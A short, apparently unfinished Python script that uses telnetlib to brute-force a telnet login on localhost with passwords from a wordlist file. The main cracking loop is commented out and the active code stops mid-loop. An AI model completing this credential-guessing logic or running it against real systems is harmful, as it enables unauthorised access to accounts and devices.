import telnetlib

# def try_password(password):
#     try:
#         HOST = "127.0.0.1"
#         PORT = 23
#         TIMEOUT = 5
#         tn = telnetlib.Telnet(HOST)
#         print("ok")
#         tn.read_until(b"Password: ")
#         tn.write(password.encode('ascii') + b"\n")
#         tn.write(b"exit\n")
#         return tn.read_all().decode('ascii')
#     except:
#         return "incorrect"

# def telnet_crack(passwords):
#     for password in passwords:
#         print(f"[-] trying {password}")
#         if "incorrect" not in try_password(password):
#             print(f"[+] Password found: {password}")
#             return True
#     return False

if __name__ == "__main__":
    passwords = [i.strip() for i in open("passwd.txt")]
    # telnet_crack(passwords)
    for word in passwords:
        tn = telnetlib.Telnet("127.0.0.1")